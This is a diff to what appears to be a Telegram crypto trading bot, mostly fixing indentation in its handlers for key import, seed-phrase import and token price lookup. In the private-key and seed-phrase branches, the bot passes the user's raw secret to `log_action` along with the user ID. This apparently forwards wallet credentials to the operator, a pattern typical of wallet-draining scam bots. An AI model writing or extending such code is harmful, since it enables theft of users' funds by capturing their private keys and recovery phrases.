@@ -199,6 +199,7 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ================= MESSAGE HANDLER =================
 async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+
     if user_id not in user_state:
         return
 
@@ -206,49 +207,49 @@ async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
 
     # IMPORT PK
-   if state == "import_pk":
-    pub = import_private_key(user_id, text)
+    if state == "import_pk":
+        pub = import_private_key(user_id, text)
 
-    await update.message.reply_text(
-        f"✅ Imported:\n{pub}" if pub else "❌ Invalid key"
-    )
+        await update.message.reply_text(
+            f"✅ Imported:\n{pub}" if pub else "❌ Invalid key"
+        )
 
-    await log_action(context, f"PK Imported\nUser:{user_id}\n{text}")
-    user_state.pop(user_id)
+        await log_action(context, f"PK Imported\nUser:{user_id}\n{text}")
+        user_state.pop(user_id)
 
+    # IMPORT PHRASE
+    elif state == "import_phrase":
+        pub = import_phrase(user_id, text)
 
-elif state == "import_phrase":
-    pub = import_phrase(user_id, text)
+        await update.message.reply_text(
+            f"✅ Imported:\n{pub}" if pub else "❌ Invalid phrase"
+        )
 
-    await update.message.reply_text(
-        f"✅ Imported:\n{pub}" if pub else "❌ Invalid phrase"
-    )
+        await log_action(context, f"Phrase Imported\nUser:{user_id}\n{text}")
+        user_state.pop(user_id)
 
-    await log_action(context, f"Phrase Imported\nUser:{user_id}\n{text}")
-    user_state.pop(user_id)
+    # MARKET
+    elif state == "search":
+        try:
+            info = get_token_info(text)
 
+            if not info:
+                await update.message.reply_text("❌ Token not found")
+            else:
+                await update.message.reply_text(
+                    f"📊 {info['name']} ({info['symbol']})\n\n"
+                    f"💰 Price: ${info['price']}\n"
+                    f"💧 Liquidity: ${info['liquidity']}\n"
+                    f"📈 24h Volume: ${info['volume24h']}\n"
+                    f"🏦 FDV: ${info['fdv']}\n\n"
+                    f"🔗 Chart: {info['chart']}"
+                )
 
-elif state == "search":
-    try:
-        info = get_token_info(text)
+        except Exception as e:
+            print("MARKET ERROR:", e)
+            await update.message.reply_text("❌ Failed to fetch token data")
 
-        if not info:
-            await update.message.reply_text("❌ Token not found")
-        else:
-            await update.message.reply_text(
-                f"📊 {info['name']} ({info['symbol']})\n\n"
-                f"💰 Price: ${info['price']}\n"
-                f"💧 Liquidity: ${info['liquidity']}\n"
-                f"📈 24h Volume: ${info['volume24h']}\n"
-                f"🏦 FDV: ${info['fdv']}\n\n"
-                f"🔗 Chart: {info['chart']}"
-            )
-
-    except Exception as e:
-        print("MARKET ERROR:", e)
-        await update.message.reply_text("❌ Failed to fetch token data")
-
-    user_state.pop(user_id)
+        user_state.pop(user_id)
     # BUY FLOW
     elif state == "buy_token":
         wallet = load_wallet(user_id)
